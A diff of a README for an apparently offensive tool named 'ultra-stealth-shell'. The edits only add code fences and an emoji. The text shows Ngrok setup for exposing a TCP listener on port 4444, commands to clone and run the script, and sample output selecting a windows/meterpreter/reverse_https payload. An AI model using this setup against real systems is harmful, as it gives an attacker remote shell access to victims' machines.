@@ -55,13 +55,13 @@ Install the following tools (most are pre-installed in Kali Linux):
 2. Create a free account and get your **auth token**
 3. Authenticate Ngrok:
 
-
+```bash
 ngrok authtoken <your_ngrok_auth_token>
-
+```
 4. Test Ngrok:
-
+```bash
 ngrok tcp 4444
-
+```
 You should see something like:
 tcp://0.tcp.ngrok.io:14233
 
@@ -75,7 +75,8 @@ git clone https://github.com/<your-username>/ultra-stealth-shell.git
 cd ultra-stealth-shell
 python3 ultra_stealth_shell.py
 ```
-Output
+📥 Output
+
 ```bash
 [+] Payload selected: windows/meterpreter/reverse_https
 [*] Starting Ngrok tunnel...
